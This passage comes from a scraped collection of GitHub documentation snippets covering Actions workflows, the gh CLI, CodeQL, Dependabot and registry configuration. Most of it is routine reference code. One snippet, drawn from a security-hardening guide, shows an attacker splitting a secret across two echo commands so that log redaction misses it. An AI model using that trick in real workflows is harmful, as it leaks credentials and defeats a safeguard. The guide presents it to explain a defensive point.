workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_35\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  call-workflow:\n    uses: octo-org/example-repo/.github/workflows/called-workflow.yml@main\n    with:\n      username: mona\n```\n\n----------------------------------------\n\nTITLE: Rendering Secret Scanning Table (Liquid Template)\nDESCRIPTION: This code snippet uses a Liquid template to generate a table displaying supported secret scanning patterns. It iterates through a `secretScanningData` array and renders table rows based on the attributes of each entry, indicating support for partner reporting, user reporting, push protection, and validity checks using octicons.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/secret-scanning/introduction/supported-secret-scanning-patterns.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{%- for entry in secretScanningData %}\n| {{ entry.provider }} | {{ entry.secretType }} | {% if entry.isPublic %}{% octicon \"check\" aria-label=\"Supported\" %}{% else %}{% octicon \"x\" aria-label=\"Unsupported\" %}{% endif %} | {% if entry.isPrivateWithGhas %}{% octicon \"check\" aria-label=\"Supported\" %}{% else %}{% octicon \"x\" aria-label=\"Unsupported\" %}{% endif %} | {% if entry.hasPushProtection %}{% octicon \"check\" aria-label=\"Supported\" %}{% else %}{% octicon \"x\" aria-label=\"Unsupported\" %}{% endif %} | {% if entry.hasValidityCheck %}{% octicon \"check\" aria-label=\"Supported\" %}{% else %}{% octicon \"x\" aria-label=\"Unsupported\" %}{% endif %} |\n{%- endfor %}\n```\n\n----------------------------------------\n\nTITLE: Adding and Committing Workflow Changes\nDESCRIPTION: These Git commands add the workflow file and the npm configuration file (either `.npmrc` or `package.json`) to the staging area, commit the changes with a descriptive message, and push the commit to the remote repository. Requires Git to be installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/quickstart.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\n$ git add .github/workflows/release-package.yml\n# Also add the file you created or edited in the previous step.\n$ git add .npmrc or package.json\n$ git commit -m \"workflow to publish package\"\n$ git push\n```\n\n----------------------------------------\n\nTITLE: Force Pushing After Interactive Rebase\nDESCRIPTION: This code snippet shows how to force push changes to the remote repository after using interactive rebase to modify commit messages. It highlights the `git push --force` command, which overwrites the remote branch's history with the local, modified history. This should be done with caution, as it can cause issues for other collaborators.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/committing-changes-to-your-project/creating-and-editing-commits/changing-a-commit-message.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngit push --force origin EXAMPLE-BRANCH\n```\n\n----------------------------------------\n\nTITLE: Getting ID Token using GitHub Script Action\nDESCRIPTION: This YAML snippet demonstrates how to retrieve an ID token using the `github-script` action. It retrieves the OIDC audience from the environment context and uses the `@actions/core` package to fetch the ID token.  Ensure that the `@actions/core` package is available in your workflow environment.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-jfrog.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\n- name: Get ID Token (using env context)\n        uses: {% data reusables.actions.action-github-script %}\n        id: idtoken\n        with:\n          script: |\n            const coredemo = require('@actions/core');\n            let id_token = await coredemo.getIDToken(process.env.OIDC_AUDIENCE);\n            coredemo.setOutput('id_token', id_token);\n```\n\n----------------------------------------\n\nTITLE: Setting Environment Variable using PowerShell (v5.1-)\nDESCRIPTION: This PowerShell script (version 5.1 and below) sets an environment variable by writing a string to the `$env:GITHUB_ENV` file using `Out-File` with UTF-8 encoding. The string is formatted as `{environment_variable_name}={value}`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_33\n\nLANGUAGE: powershell\nCODE:\n```\n\"{environment_variable_name}={value}\" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append\n```\n\n----------------------------------------\n\nTITLE: Migrating a Single Repository using gh ado2gh\nDESCRIPTION: This command migrates a single repository from Azure DevOps to GitHub using the `gh ado2gh migrate-repo` command. It requires specifying the source Azure DevOps organization, team project, and repository name, as well as the destination GitHub organization and repository name. The command uses the GitHub CLI with the `ado2gh` extension.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-from-azure-devops-to-github-enterprise-cloud/migrating-repositories-from-azure-devops-to-github-enterprise-cloud.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\ngh ado2gh migrate-repo --ado-org SOURCE --ado-team-project TEAM-PROJECT --ado-repo CURRENT-NAME --github-org DESTINATION --github-repo NEW-NAME\n```\n\n----------------------------------------\n\nTITLE: Defining Workflow Environment Variables\nDESCRIPTION: This YAML snippet demonstrates how to define environment variables at the workflow level using the `env` property. These variables are available to all jobs and steps within the workflow. The example sets the `SERVER` variable to `production`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nenv:\n  SERVER: production\n```\n\n----------------------------------------\n\nTITLE: Executing gh COMMAND\nDESCRIPTION: This snippet shows how to list all subcommands associated with a GitHub CLI command. Replace COMMAND with the specific command. No dependencies are required.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/github-cli-reference.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh COMMAND\n```\n\n----------------------------------------\n\nTITLE: Editing a Release using GitHub CLI\nDESCRIPTION: This snippet shows how to edit a release's title using the `gh release edit` subcommand.  It requires the GitHub CLI to be installed and configured and specifies the tag of the release to be edited. The `-t` flag is used to update the title.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/releasing-projects-on-github/managing-releases-in-a-repository.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh release edit TAG -t \"NEW-TITLE\"\n```\n\n----------------------------------------\n\nTITLE: Download attestation bundle with GitHub CLI\nDESCRIPTION: Downloads the attestation bundle for a specified artifact from the GitHub attestation API. Requires the GitHub CLI (`gh`) to be installed and authenticated. Replace `PATH/TO/YOUR/BUILD/ARTIFACT-BINARY` with the path to the artifact and `ORGANIZATION_NAME/REPOSITORY_NAME` with the repository name.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/verifying-attestations-offline.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngh attestation download PATH/TO/YOUR/BUILD/ARTIFACT-BINARY -R ORGANIZATION_NAME/REPOSITORY_NAME\n```\n\n----------------------------------------\n\nTITLE: Example of Corrected JSON Data\nDESCRIPTION: This corrected JSON data snippet resolves the parsing error by adding the missing closing quotation mark to the `conditions` value within the `current_weather` object.  This ensures that the string is properly terminated and the JSON is valid.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/debugging-errors/debugging-invalid-json.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"location\": \"San Francisco\",\n  \"current_weather\": {\n    \"temperature\": 18,\n    \"unit\": \"Celsius\",\n    \"conditions\": \"Cloudy\"\n  },\n  \"forecast\": {\n    \"day\": \"Monday\",\n    \"high\": 22,\n    \"low\": 15,\n    \"precipitation\": 10\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Git Credential Caching for GitHub - Shell\nDESCRIPTION: This command configures Git globally to cache credentials based on the full remote URL, enhancing security and preventing repeated authentication prompts when interacting with repositories on {% data variables.product.prodname_dotcom %}. No dependencies are required beyond a standard Git installation.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/git/cache-on-repository-path.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit config --global credential.https://github.com.useHttpPath true\n```\n\n----------------------------------------\n\nTITLE: Configuring NuGet with PAT - Subdomain Isolation Disabled\nDESCRIPTION: This XML snippet demonstrates the configuration of a `nuget.config` file for authenticating with GitHub Packages using a Personal Access Token (PAT) when subdomain isolation is disabled. It specifies the GitHub Packages URL and credentials for authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-nuget-registry.md#_snippet_2\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<configuration>\n    <packageSources>\n        <clear />\n        <add key=\"github\" value=\"https://HOSTNAME/_registry/nuget/NAMESPACE/index.json\" />\n    </packageSources>\n    <packageSourceCredentials>\n        <github>\n            <add key=\"Username\" value=\"USERNAME\" />\n            <add key=\"ClearTextPassword\" value=\"TOKEN\" />\n        </github>\n    </packageSourceCredentials>\n</configuration>\n```\n\n----------------------------------------\n\nTITLE: Create Azure App Service Web App - Bash\nDESCRIPTION: This command uses the Azure CLI to create an Azure App Service web app with a .NET runtime. It requires replacing placeholders like `MY_WEBAPP_NAME`, `MY_APP_SERVICE_PLAN`, and `MY_RESOURCE_GROUP` with actual values. `MY_WEBAPP_NAME` represents the desired name for the web app.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-net-to-azure-app-service.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\naz webapp create \\\n    --name MY_WEBAPP_NAME \\\n    --plan MY_APP_SERVICE_PLAN \\\n    --resource-group MY_RESOURCE_GROUP \\\n    --runtime \"DOTNET|5.0\"\n```\n\n----------------------------------------\n\nTITLE: Trigger workflow when a pull request merges, with conditional job (YAML)\nDESCRIPTION: This snippet shows how to run a workflow when a pull request is closed, and conditionally execute a job only if the pull request was merged. It uses the `pull_request` event with the `closed` type and checks the `github.event.pull_request.merged` value.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_26\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  pull_request:\n    types:\n      - closed\n\njobs:\n  if_merged:\n    if: github.event.pull_request.merged == true\n    runs-on: ubuntu-latest\n    steps:\n    - run: |\n        echo The PR was merged\n```\n\n----------------------------------------\n\nTITLE: Configuring Python registry with username/password in dependabot.yml\nDESCRIPTION: This snippet configures a Python package index in `dependabot.yml` using a username and password. It specifies the registry type, URL, username, and password, which should be stored as a GitHub secret.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_18\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  python-example:\n    type: python-index\n    url: https://example.com/_packaging/my-feed/pypi/example\n    username: octocat\n    password: ${{secrets.MY_BASIC_AUTH_PASSWORD}}\n```\n\n----------------------------------------\n\nTITLE: CodeQL CLI Example CI Configuration (Shell)\nDESCRIPTION: This shell script demonstrates a complete CI configuration using the CodeQL CLI. It creates CodeQL databases for Java and Python, analyzes them using specified queries, and then uploads the resulting SARIF files to GitHub. The script assumes the availability of a build script (myBuildScript) and a GitHub token (GITHUB_TOKEN).\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/about-the-codeql-cli.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n# Create CodeQL databases for Java and Python in the 'codeql-dbs' directory\n# Call the normal build script for the codebase: 'myBuildScript'\n\ncodeql database create codeql-dbs --source-root=src \\\n    --db-cluster --language=java,python --command=./myBuildScript\n\n# Analyze the CodeQL database for Java, 'codeql-dbs/java'\n# Tag the data as 'java' results and store in: 'java-results.sarif'\n\ncodeql database analyze codeql-dbs/java java-code-scanning.qls \\\n    --format=sarif-latest --sarif-category=java --output=java-results.sarif\n\n# Analyze the CodeQL database for Python, 'codeql-dbs/python'\n# Tag the data as 'python' results and store in: 'python-results.sarif'\n\ncodeql database analyze codeql-dbs/python python-code-scanning.qls \\\n    --format=sarif-latest --sarif-category=python --output=python-results.sarif\n\n# Upload the SARIF file with the Java results: 'java-results.sarif'\n# The {% data variables.product.prodname_github_app %} or {% data variables.product.pat_generic %} created for authentication\n# with {% data variables.product.company_short %}'s REST API is available in the `GITHUB_TOKEN` environment variable.\n\ncodeql github upload-results \\\n    --repository=my-org/example-repo \\\n    --ref=refs/heads/main --commit=deb275d2d5fe9a522a0b7bd8b6b6a1c939552718 \\\n    --sarif=java-results.sarif\n\n# Upload the SARIF file with the Python results: 'python-results.sarif'\n\ncodeql github upload-results \\\n    --repository=my-org/example-repo \\\n    --ref=refs/heads/main --commit=deb275d2d5fe9a522a0b7bd8b6b6a1c939552718 \\\n    --sarif=python-results.sarif\n```\n\n----------------------------------------\n\nTITLE: Query Project Data Using GitHub CLI and GraphQL\nDESCRIPTION: Uses the GitHub CLI (`gh api graphql`) to query the GraphQL API for project data, including project ID, field IDs, and single select field options. The response is stored in a `project_data.json` file, which is then parsed to extract the required IDs and set them as environment variables. It uses `jq` to parse the JSON.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/automating-projects-using-actions.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh api graphql -f query='\\n            query($org: String!, $number: Int!) {\\n              organization(login: $org){\\n                projectV2(number: $number) {\\n                  id\\n                  fields(first:20) {\\n                    nodes {\\n                      ... on ProjectV2Field {\\n                        id\\n                        name\\n                      }\\n                      ... on ProjectV2SingleSelectField {\\n                        id\\n                        name\\n                        options {\\n                          id\\n                          name\\n                        }\\n                      }\\n                    }\\n                  }\\n                }\\n              }\\n            }' -f org=$ORGANIZATION -F number=$PROJECT_NUMBER > project_data.json\n\n          # Parses the response from the API query and stores the relevant IDs as environment variables. Modify this to get the ID for different fields or options. For example:\n          #\n          # - To get the ID of a field called `Team`, add `echo 'TEAM_FIELD_ID='$(jq '.data.organization.projectV2.fields.nodes[] | select(.name== \"Team\") | .id' project_data.json) >> $GITHUB_ENV`.\n          # - To get the ID of an option called `Octoteam` for the `Team` single select field, add `echo 'OCTOTEAM_OPTION_ID='$(jq '.data.organization.projectV2.fields.nodes[] | select(.name== \"Team\") |.options[] | select(.name==\"Octoteam\") |.id' project_data.json) >> $GITHUB_ENV`.\n          #\n          # **Note:** This workflow assumes that you have a project with a single select field called \"Status\" that includes an option called \"Todo\" and a date field called \"Date posted\". You must modify this section to match the fields that are present in your table.\n\n          echo 'PROJECT_ID='$(jq '.data.organization.projectV2.id' project_data.json) >> $GITHUB_ENV\n          echo 'DATE_FIELD_ID='$(jq '.data.organization.projectV2.fields.nodes[] | select(.name== \"Date posted\") | .id' project_data.json) >> $GITHUB_ENV\n          echo 'STATUS_FIELD_ID='$(jq '.data.organization.projectV2.fields.nodes[] | select(.name== \"Status\") | .id' project_data.json) >> $GITHUB_ENV\n          echo 'TODO_OPTION_ID='$(jq '.data.organization.projectV2.fields.nodes[] | select(.name== \"Status\") | .options[] | select(.name==\"Todo\") |.id' project_data.json) >> $GITHUB_ENV\n```\n\n----------------------------------------\n\nTITLE: Receiving Copilot Confirmation Response - Typescript\nDESCRIPTION: This code snippet shows the format of the message the agent receives after the user accepts or dismisses the confirmation. It contains the state of the confirmation (accepted or dismissed) and the original confirmation data, which allows the agent to identify the corresponding action.  The agent uses the values in this message to then complete or cancel the appropriate action.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/building-a-copilot-agent-for-your-copilot-extension/configuring-your-copilot-agent-to-communicate-with-the-copilot-platform.md#_snippet_1\n\nLANGUAGE: typescript\nCODE:\n```\n//\n{\n    \"copilot_confirmations\": [\n        {\n            // A string containing the state of the confirmation. This value is either `accepted` or `dismissed`.\n            \"state\": \"accepted\",\n            // An array of strings containing data identifying the relevant action.\n            \"confirmation\": {\n                \"id\": \"id-123\",\n                \"other\": \"identifier-as-needed\",\n            }\n        }\n    ]\n}\n```\n\n----------------------------------------\n\nTITLE: Workflow to Label Issues on Open/Reopen - YAML\nDESCRIPTION: This workflow automatically adds labels to issues when they are opened or reopened. It uses the GitHub CLI (`gh`) to edit the issue and add the specified labels. The `GH_TOKEN` is used for authentication, `GH_REPO` specifies the repository, `NUMBER` identifies the issue, and `LABELS` contains the comma-separated list of labels to apply. The workflow requires `issues: write` permission.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/project-management/adding-labels-to-issues.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: Label issues\non:\n  issues:\n    types:\n      - reopened\n      - opened\njobs:\n  label_issues:\n    runs-on: ubuntu-latest\n    permissions:\n      issues: write\n    steps:\n      - run: gh issue edit \"$NUMBER\" --add-label \"$LABELS\"\n        env:\n          GH_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n          GH_REPO: {% raw %}${{ github.repository }}{% endraw %}\n          NUMBER: {% raw %}${{ github.event.issue.number }}{% endraw %}\n          LABELS: triage\n```\n\n----------------------------------------\n\nTITLE: Triggering Workflow on Release Published Event (YAML)\nDESCRIPTION: This workflow configuration triggers when a release is published in the repository. It uses the `release` event with the `published` type.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_42\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  release:\n    types: [published]\n```\n\n----------------------------------------\n\nTITLE: Handling Rate Limit Errors with Retry Logic\nDESCRIPTION: This code demonstrates how to handle GitHub API rate limits by retrying the request after waiting for the rate limit to reset.  It checks for a 403 Forbidden error with a `x-ratelimit-remaining` header of '0', calculates the time to wait, and uses `setTimeout` to retry the request.  A recursive function is utilized to perform the retry.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-javascript.md#_snippet_14\n\nLANGUAGE: javascript\nCODE:\n```\nasync function requestRetry(route, parameters) {\n  try {\n    const response = await octokit.request(route, parameters);\n    return response\n  } catch (error) {\n    if (error.response && error.status === 403 && error.response.headers['x-ratelimit-remaining'] === '0') {\n      const resetTimeEpochSeconds = error.response.headers['x-ratelimit-reset'];\n      const currentTimeEpochSeconds = Math.floor(Date.now() / 1000);\n      const secondsToWait = resetTimeEpochSeconds - currentTimeEpochSeconds;\n      console.log(`You have exceeded your rate limit. Retrying in ${secondsToWait} seconds.`);\n      setTimeout(requestRetry, secondsToWait * 1000, route, parameters);\n    } else {\n      console.error(error);\n    }\n  }\n}\n\nconst response = await requestRetry(\"GET /repos/{owner}/{repo}/issues\", {\n    owner: \"github\",\n    repo: \"docs\",\n    per_page: 2\n  })\n```\n\n----------------------------------------\n\nTITLE: Publishing Ruby Gems to GPR and RubyGems using GitHub Actions\nDESCRIPTION: This workflow builds and publishes a Ruby gem to both GitHub Package Registry (GPR) and RubyGems. It sets up the required permissions, checks out the code, sets up Ruby version 2.6, installs dependencies, configures credentials for GPR and RubyGems using secrets, builds the gem, and pushes it to both registries. It relies on the `GITHUB_TOKEN` secret for GPR and the `RUBYGEMS_AUTH_TOKEN` secret for RubyGems authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-ruby.md#_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\nname: Ruby Gem\n\non:\n  # Manually publish\n  workflow_dispatch:\n  # Alternatively, publish whenever changes are merged to the `main` branch.\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  build:\n    name: Build + Publish\n    runs-on: ubuntu-latest\n    permissions:\n      packages: write\n      contents: read\n\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Set up Ruby 2.6\n        uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n        with:\n          ruby-version: '2.6'\n      - run: bundle install\n\n      - name: Publish to GPR\n        run: |{% raw %}\n          mkdir -p $HOME/.gem\n          touch $HOME/.gem/credentials\n          chmod 0600 $HOME/.gem/credentials\n          printf -- \"---\\n:github: ${GEM_HOST_API_KEY}\\n\" > $HOME/.gem/credentials\n          gem build *.gemspec\n          gem push --KEY github --host https://rubygems.pkg.github.com/${OWNER} *.gem\n        env:\n          GEM_HOST_API_KEY: \"Bearer ${{secrets.GITHUB_TOKEN}}\"\n          OWNER: ${{ github.repository_owner }}\n\n      - name: Publish to RubyGems\n        run: |\n          mkdir -p $HOME/.gem\n          touch $HOME/.gem/credentials\n          chmod 0600 $HOME/.gem/credentials\n          printf -- \"---\\n:rubygems_api_key: ${GEM_HOST_API_KEY}\\n\" > $HOME/.gem/credentials\n          gem build *.gemspec\n          gem push *.gem\n        env:\n          GEM_HOST_API_KEY: \"${{secrets.RUBYGEMS_AUTH_TOKEN}}\"{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Mirror Cloning a Git Repository using Git CLI\nDESCRIPTION: This command performs a mirror clone of a Git repository, including all branches, tags, and other references. This creates a complete backup of the repository's history and structure. It requires Git to be installed.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/archiving-a-github-repository/backing-up-a-repository.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngit clone --mirror https://github.com/EXAMPLE-USER/REPOSITORY.git\n```\n\n----------------------------------------\n\nTITLE: Using a Public Docker Registry Action (YAML)\nDESCRIPTION: This YAML snippet shows how to use a Docker image from a public Docker registry (e.g., Google Container Registry) in a GitHub Actions workflow. It uses the `docker://{host}/{image}:{tag}` format in the `uses` keyword to specify the image location.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_16\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  my_first_job:\n    steps:\n      - name: My first step\n        uses: docker://gcr.io/cloud-builders/gradle\n```\n\n----------------------------------------\n\nTITLE: Example Dependabot YAML Configuration\nDESCRIPTION: This YAML snippet showcases a more comprehensive `dependabot.yml` file. It includes configurations for npm, Docker, and GitHub Actions, demonstrating how to specify the package ecosystem, directory, and schedule for each. It shows the minimal required configuration for three package managers.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-version-updates/configuring-dependabot-version-updates.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n# Basic `dependabot.yml` file with\n# minimum configuration for three package managers\n\nversion: 2\nupdates:\n  # Enable version updates for npm\n  - package-ecosystem: \"npm\"\n    # Look for `package.json` and `lock` files in the `root` directory\n    directory: \"/\"\n    # Check the npm registry for updates every day (weekdays)\n    schedule:\n      interval: \"daily\"\n\n  # Enable version updates for Docker\n  - package-ecosystem: \"docker\"\n    # Look for a `Dockerfile` in the `root` directory\n    directory: \"/\"\n    # Check for updates once a week\n    schedule:\n      interval: \"weekly\"\n\n  # Enable version updates for GitHub Actions\n  - package-ecosystem: \"github-actions\"\n    # Workflow files stored in the default location of `.github/workflows`\n    # You don't need to specify `/.github/workflows` for `directory`. You can use `directory: \"/\"`.\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n```\n\n----------------------------------------\n\nTITLE: Installing dependencies from requirements.txt\nDESCRIPTION: This snippet sets up a Python version and installs dependencies from a `requirements.txt` file using pip.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-python.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n- uses: {% data reusables.actions.action-checkout %}\n- name: Set up Python\n  uses: {% data reusables.actions.action-setup-python %}\n  with:\n    python-version: '3.x'\n- name: Install dependencies\n  run: |\n    python -m pip install --upgrade pip\n    pip install -r requirements.txt\n```\n\n----------------------------------------\n\nTITLE: Using a Matrix Strategy in GitHub Actions Workflow (YAML)\nDESCRIPTION: This snippet demonstrates how to use a matrix strategy in a GitHub Actions workflow to run a job multiple times with different configurations. The `strategy.matrix` keyword defines an array of build options, in this case, different versions of Node.js. The `node-version` is then set using the matrix value.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/about-workflows.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  build:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        node: [14, 16]\n    steps:\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: {% raw %}${{ matrix.node }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Updating Callback Handler to Display User Info in Ruby\nDESCRIPTION: This code updates the callback URL handler to fetch and display user information after obtaining the access token. It calls the `user_info` function, extracts the user's login handle and name from the API response, and displays a personalized welcome message. Remember to replace CALLBACK_URL with the correct URL for your app.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-login-with-github-button-with-a-github-app.md#_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nget \"CALLBACK_URL\" do\n  code = params[\"code\"]\n\n  token_data = exchange_code(code)\n\n  if token_data.key?(\"access_token\")\n    token = token_data[\"access_token\"]\n\n    user_info = user_info(token)\n    handle = user_info[\"login\"]\n    name = user_info[\"name\"]\n\n    render = \"Successfully authorized! Welcome, #{name} (#{handle}).\"\n    erb render\n  else\n    render = \"Authorized, but unable to exchange code #{code} for token.\"\n    erb render\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Workflow with cURL and GITHUB_TOKEN\nDESCRIPTION: This workflow uses `curl` within a GitHub Actions environment to authenticate and interact with the GitHub REST API. It leverages the `GITHUB_TOKEN` stored in the `GH_TOKEN` environment variable to authorize the `curl` request, demonstrating a method to fetch data from the API within the workflow's execution context.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/quickstart.md#_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  workflow_dispatch:\njobs:\n  use_api:\n    runs-on: ubuntu-latest\n    permissions:\n      issues: read\n    steps:\n      - env:\n          GH_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n        run: |\n          curl --request GET \\\n          --url \"{% data variables.product.rest_url %}{% data variables.rest.example_request_url %}\" \\\n          --header \"Accept: application/vnd.github+json\" \\\n          --header \"Authorization: Bearer $GH_TOKEN\"\n```\n\n----------------------------------------\n\nTITLE: Exfiltrating Secrets via Obfuscation\nDESCRIPTION: This shell command shows how an attacker can attempt to exfiltrate a secret by obfuscating it and sending it to the log, bypassing secret redaction.  It demonstrates a potential vulnerability where secrets, even partially, can be leaked.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\necho ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};\n```\n\n----------------------------------------\n\nTITLE: Using a GitHub Container Registry Action (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to use a Docker image from the GitHub Container Registry within a GitHub Actions workflow. It uses the `docker://{host}/{image}:{tag}` format, specifically `docker://ghcr.io/OWNER/IMAGE_NAME`, in the `uses` keyword.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_15\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  my_first_job:\n    steps:\n      - name: My first step\n        uses: docker://ghcr.io/OWNER/IMAGE_NAME\n```\n\n----------------------------------------\n\nTITLE: Displaying Migrate Options - Bash\nDESCRIPTION: This command displays available options for the `migrate` subcommand of the GitHub Actions Importer CLI.  The `migrate` subcommand converts a pipeline to a GitHub Actions workflow and creates a pull request with the changes. The `-h` flag shows the help message. The command is executed via the `gh` CLI.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/automating-migration-with-github-actions-importer.md#_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n$ gh actions-importer migrate -h\n```\n\n----------------------------------------\n\nTITLE: Creating CodeQL Databases for Multiple Languages\nDESCRIPTION: This shell script demonstrates how to create CodeQL databases for multiple languages (Python and C/C++) using the `codeql database create` command. It utilizes the `--db-cluster` option to request analysis of multiple languages, specifies the languages with `--language`, provides the build command using `--command`, and skips unnecessary builds with `--no-run-unnecessary-builds`. The resulting databases are stored in separate subdirectories.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n$ codeql database create /codeql-dbs/example-repo-multi \\\n    --db-cluster --language python,c-cpp \\\n    --command make --no-run-unnecessary-builds \\\n    --source-root /checkouts/example-repo-multi\nInitializing databases at /codeql-dbs/example-repo-multi.\nRunning build command: [make]\n[build-stdout] Calling python3 /codeql-bundle/codeql/python/tools/get_venv_lib.py\n[build-stdout] Calling python3 -S /codeql-bundle/codeql/python/tools/python_tracer.py -v -z all -c /codeql-dbs/example-repo-multi/python/working/trap_cache -p ERROR: 'pip' not installed.\n[build-stdout] /usr/local/lib/python3.6/dist-packages -R /checkouts/example-repo-multi\n[build-stdout] [INFO] Python version 3.6.9\n[build-stdout] [INFO] Python extractor version 5.16\n[build-stdout] [INFO] [2] Extracted file /checkouts/example-repo-multi/hello.py in 5ms\n[build-stdout] [INFO] Processed 1 modules in 0.15s\n[build-stdout] <output from calling 'make' to build the C/C++ code>\nFinalizing databases at /codeql-dbs/example-repo-multi.\nSuccessfully created databases at /codeql-dbs/example-repo-multi.\n$\n```\n\n----------------------------------------\n\nTITLE: Setting GitHub Config URL\nDESCRIPTION: This snippet shows how to set the `githubConfigUrl` in the `values.yaml` file to deploy runner scale sets to a specific repository, organization, or enterprise.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\ngithubConfigUrl: \"https://github.com/octo-ent/octo-org/octo-repo\"\n```\n\n----------------------------------------\n\nTITLE: Configuring GitHub CLI using gh config set\nDESCRIPTION: This command allows users to configure settings for the GitHub CLI, such as the preferred text editor.  For example, the editor can be set to VS Code using `code 